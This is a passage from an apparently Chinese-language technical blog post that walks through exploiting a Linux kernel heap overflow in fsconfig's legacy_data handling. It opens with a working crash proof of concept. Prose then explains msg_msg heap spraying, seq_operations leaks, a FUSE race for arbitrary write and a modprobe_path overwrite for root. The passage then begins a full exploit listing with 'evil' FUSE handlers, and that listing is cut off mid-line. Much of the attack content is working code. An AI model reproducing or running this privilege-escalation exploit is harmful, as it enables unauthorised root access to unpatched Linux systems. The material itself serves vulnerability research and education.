__NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make an oob-write by fsconfig */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，成功通过堆溢出造成 kernel panic：</p><p><img src="https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png" alt="image.png"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>现在我们有了任意长度的堆溢出，而可溢出对象用的分配 flag 为 <code>GFP_KERNEL</code>、大小为 4k（一张内存页大小），那么我们不难想到可以基于<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">我们的老朋友 System V 消息队列结构体</a>来完成利用</p><h2 id="Step-I-堆喷-msg-msg，覆写-m-ts-字段进行越界读取"><a href="#Step-I-堆喷-msg-msg，覆写-m-ts-字段进行越界读取" class="headerlink" title="Step.I - 堆喷 msg_msg，覆写 m_ts 字段进行越界读取"></a>Step.I - 堆喷 msg_msg，覆写 m_ts 字段进行越界读取</h2><p>我们先来复习一下消息队列中一条消息的基本结构，当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体作为信息的 header：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在单个消息队列上发送一条消息时，若大小<strong>不大于【一个页面大小 - header size】</strong>，则仅使用一个 <code>msg_msg</code> 结构体进行存储，而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构，而单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体，链表最后以 NULL 结尾：</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>由于我们有越界写，那么我们不难想到的是我们可以将 <code>msg_msg</code> 与 <code>ctx-&gt;legacy_data</code> 堆喷到一起，之后越界写入相邻 <code>msg_msg</code> 的 header 将 <code>m_ts</code> 改大，之后我们再使用 <code>msgrcv()</code> 读取消息，便能读取出超出该消息范围的内容，从而完成越界读取；由于我们的越界写入会破坏 <code>msg_msg</code> 头部的双向链表，因此在读取时我们应当使用 <code>MSG_COPY</code> 以保持消息在队列上不会被 unlink</p><p>由于 <code>ctx-&gt;legacy_data</code> 的大小已经是 4k 了，故我们考虑在 <code>msg_msgseg</code> 上完成越界读取，由于 <code>msgrcv()</code> 拷贝消息时以单链表结尾 NULL 作为终止，故我们最多可以在 <code>msg_msgseg</code> 上读取将近一张内存页大小的数据，因此我们考虑让 <code>msg_msgseg</code> 的消息尽量小，从而让我们能够越界读取到更多的 object</p><p>接下来考虑如何使用越界读取进行数据泄露，这里我们考虑堆喷其他的可以泄露数据的小结构体与我们的 <code>msg_msgseg</code> 混在一起，从而使得我们越界读取时可以直接读到我们堆喷的这些小结构体，从而泄露出内核代码段加载基地址，那么这里笔者考虑堆喷 <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x02-seq-file-%E7%9B%B8%E5%85%B3">seq_operations</a> 来完成数据的泄露</p><p>为了提高越界写入 <code>msg_msg</code> 的成功率，笔者选择先堆喷一部分 <code>msg_msg</code>，之后分配  <code>ctx-&gt;legacy_data</code> ， 接下来再堆喷另一部分 <code>msg_msg</code>为了提高数据泄露的成功概率，笔者选择在每次在消息队列上发送消息时都喷一个 <code>seq_operations</code>，在完成消息队列的发送之后再喷射大量的 <code>seq_operations</code></p><p>不过需要注意的是我们的越界写并不一定能写到相邻的 <code>msg_msg</code>，也可能写到其他结构体或是 free object，若 free object 的 next 指针刚好位于开头被我们 overwrite 了，则会在后面的分配中导致 kernel panic</p><h2 id="Step-II-堆喷-msg-msg，利用-FUSE-在消息拷贝时覆写-next-字段进行任意地址写"><a href="#Step-II-堆喷-msg-msg，利用-FUSE-在消息拷贝时覆写-next-字段进行任意地址写" class="headerlink" title="Step.II - 堆喷 msg_msg，利用 FUSE 在消息拷贝时覆写 next 字段进行任意地址写"></a>Step.II - 堆喷 msg_msg，利用 FUSE 在消息拷贝时覆写 next 字段进行任意地址写</h2><p>接下来我们该考虑如何进行提权的工作了，通过覆写 <code>msg_msg</code> 的方式我们同样可以进行任意地址写的操作，由于消息发送时在 <code>do_msgsnd()</code> 当中是先分配对应的 <code>msg_msg</code> 与 <code>msg_msgseg</code> 链表作为消息的存储空间再进行拷贝，那么我们不难想到的是我们可以先发送一个大于一张内存页大小的消息，这样会分配一个 4k 的 <code>msg_msg</code> 与一个 <code>msg_msgseg</code> ，在 <code>do_msgsnd()</code> 中完成空间分配后在 <code>msg_msg</code> 上进行数据拷贝的时候，我们在另一个线程当中使用越界写更改 <code>msg_msg</code> 的 header，使其 next 指针更改到我们想要写入数据的地方，当 <code>do_msgsnd()</code> 开始将数据拷贝到 <code>msg_msgseg</code> 上时，由于 <code>msg_msg</code> 的 next 指针已经被我们所更改，故其会将数据写入到我们指定的地址上，从而完成任意地址写</p><p><img src="https://s2.loli.net/2023/01/10/JxidQjuHn6ZKs4l.png" alt="image.png"></p><p>不过 <code>do_msgsnd()</code> 的所有操作在一个系统调用中完成，因此这需要我们进行条件竞争，而常规的条件竞争通常很难成功，那么我们不难想到的是我们可以利用 <a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">userfaultfd</a> 让  <code>do_msgsnd()</code> 在拷贝数据到  <code>msg_msg</code>  时触发用户空间的缺页异常，陷入到我们的 page fault handler 中，我们在 handler 线程中再进行越界写，之后恢复到原线程，这样利用的成功率便大大提高了</p><p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" alt="image.png"></p><p>但是自 kernel 版本 5.11 起<strong>非特权用户无法使用 userfaultfd</strong>，而该漏洞影响的内核版本包括 5.11以上的版本，因此我们需要使用更为通用的办法——<strong>用户空间文件系统</strong>（filesystem in userspace，<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#FUSE-race">FUSE</a>）可以被用作 userfaultfd 的替代品，帮助我们完成条件竞争的利用</p><p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></p><p>不过需要注意的是，由于 slub allocator 的随机性，<strong>我们并不能保证一定能够溢出到陷入 FUSE 中的 msg_msg ，</strong>因此需要多次分配并进行检查以确保我们完成了任意地址写</p><p>有了任意地址写，现在该考虑写哪里、写什么了，我们可以通过覆写一些全局函数表来劫持内核执行流，或是覆写一些其他的东西完成提权，这里笔者选择覆写 <code>modprobe_path</code> 完成提权，当我们执行一个格式非法的程序时，内核会以 root 权限执行 <code>modprobe_path</code> 所指的应用，我们只需要将其改为我们的恶意脚本的路径即可</p><h2 id="FINAL-EXPLOIT"><a href="#FINAL-EXPLOIT" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h2><p>最后由笔者编写的 exp 如下，因为一些原因暂时无法进行验证，但是思路应该是对的，在理论上应当可行：</p><blockquote><p>内核地址泄露的部分经过验证了，但是对于 FUSE 进行利用的部分，由于笔者在复现漏洞时使用的是 CTF 中 kernel pwn 的简易环境，故没法使用 FUSE：(</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  <span class="hljs-string">&#x27;B&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NUM 0x100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HOLE_SPACE 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;/tmp/evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span class="hljs-string">&quot;/&quot;</span> EVIL_FILE_NAME</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) <br>               + SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; primary_msg;<br><br><span class="hljs-type">char</span> *evil_args[] = &#123; EVIL_DAEMON_NAME, EVIL_MOUNT_PATH, <span class="hljs-literal">NULL</span> &#125;;<br><span class="hljs-type">int</span> exp_fs_fd;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_readdir</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-type">void</span>* buf, </span><br><span class="hljs-params">                               <span class="hljs-type">fuse_fill_dir_t</span> filler, <span class="hljs-type">off_t</span> offset, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info* fi, </span><br><span class="hljs-params">                               <span class="hljs-keyword">enum</span> fuse_readdir_flags flags)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_getattr</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* path, <span class="hljs-keyword">struct</span> stat *stbuf, </span><br><span class="hljs-params">                               <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_read</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                            <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3fuse_evil_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> size, </span><br><span class="hljs-params">                             <span class="hljs-type">off_t</span> offset, <span class="hljs-keyword">struct</span> fuse_file_info *fi)</span>;<br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> <span class="hljs-title">a3fuse_evil_ops</span> =</span> &#123;<br>    .readdir = a3fuse_evil_readdir,<br>    .getattr = a3fuse_evil_getattr,<br>    .read = a3fuse_evil_read,<br>    .write = a3fuse_evil_write,<br>&#125;;<br><br><span class="hljs-type">char</span> cat_flag[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 